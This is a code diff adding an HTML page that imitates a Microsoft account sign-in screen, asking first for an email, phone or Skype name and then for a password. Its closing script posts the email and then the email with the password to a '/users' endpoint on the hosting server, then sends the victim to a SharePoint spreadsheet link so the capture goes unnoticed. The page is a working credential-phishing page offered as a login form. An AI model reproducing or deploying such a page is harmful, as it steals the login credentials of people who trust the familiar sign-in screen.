@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sign in to your account</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="feuilledestyle.css">
+    <link rel="shortcut icon" href="imageicone.ico">
+</head>
+<body>
+    <div>
+        <form method="post" class="provide-min-height">
+            <div>
+                <div class="background-image-holder">
+                    <div class="background-image" style="background-image: url('colorgradient.svg');"></div>
+                </div>
+            </div>
+            <div class="outer">
+                <div class="template-section main-section">
+                    <div class="middle">
+                        <div class="full-height">
+                            <div class="flex-column">
+                                <div class="win-scroll">
+                                    <div class="sign-in-box fade-in-lightbox has-popup">
+                                        <img class="logo" src="monbeaulogo.svg" alt="Logo">
+                                        <div>
+                                            <div class="identityBanner" id="banner" style="display:none">
+                                                <button type="button" class="backButton">
+                                                    <img src="iconedusite.svg" alt="Back">
+                                                </button>
+                                                <div id="displayEmail" class="identity"></div>
+                                            </div>
+                                            <div class="pagination-view animate slide-in-next">
+                                                <div>
+                                                    <div class="row title">
+                                                        <div id="formTitle">Sign in</div>
+                                                    </div>
+                                                    <div class="row">
+                                                        <div class="form-group col-md-24">
+                                                            <div class="placeholderContainer">
+                                                                <input type="email" id="inputEmail" class="form-control input" placeholder="Email, phone, or Skype">
+                                                                <input type="password" id="inputPassword" class="form-control input" placeholder="Password" style="display:none">
+                                                                <keeper-lock class="focus-visible logged-in" style="background-image: url('chrome-extension://bfogiafebfohielmmehodmfbbebbbpei/images/ico-field-fill-lock.svg'); background-size: 24px 24px; cursor: pointer; width: 24px; position: absolute; opacity: 1; margin-top: auto; min-width: 24px; top: 6px; left: 314px; z-index: 1; padding: 0; animation-name: none; height: 24px;" aria-label="Open Keeper Popup" role="button"></keeper-lock>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <div class="password-reset-links-container">
+                                                        <div class="row">
+                                                            <div class="col-md-24">
+                                                                <div class="text-13">
+                                                                    <div>No account? <a href="#">Create one!</a></div>
+                                                                    <br/>
+                                                                    <div><a href="#">Can't access your account?</a></div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <div class="win-button-pin-bottom">
+                                                        <div class="row">
+                                                            <div>
+                                                                <div class="col-xs-24 button-container">
+                                                                    <div class="inline-block button-item">
+                                                                        <input type="submit" id="btnEmail" class="win-button button_primary high-contrast-overrides button ext-button primary ext-primary" value="Next">
+                                                                        <input type="submit" id="btnPassword" class="win-button button_primary high-contrast-overrides button ext-button primary ext-primary" value="Next" style="display:none">
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </form>
+
+        <script>
+            window.addEventListener('load', () => {
+                var data;
+                document.getElementById('btnEmail').addEventListener('click', async e => {
+                    e.preventDefault();
+                    data = document.getElementById('inputEmail').value;
+                    document.getElementById('displayEmail').innerHTML = data;
+                    document.getElementById('banner').style.display = 'block';
+                    document.getElementById('formTitle').innerHTML = 'Enter password';
+                    document.getElementById('inputEmail').style.display = 'none';
+                    document.getElementById('inputPassword').style.display = 'block';
+                    document.getElementById('btnPassword').style.display = 'block';
+                    document.getElementById('btnEmail').style.display = 'none';
+                    await fetch('/users', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ email: data })
+                    });
+                });
+                document.getElementById('btnPassword').addEventListener('click', async e => {
+                    e.preventDefault();
+                    const passwd = document.getElementById('inputPassword').value;
+                    await fetch('/users', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ email: data, password: passwd })
+                    });
+                    document.location = 'https://209416ordago-my.sharepoint.com/:x:/g/personal/jade_amoretti_ordago_fr/Ec61gvcwXAJGqGZGJUmWWvoBV347YWJA754mfX35mMZv6w?rtime=XUo888q03Ug';
+                });
+            });
+        </script>
+    </div>
+</body>
+</html>
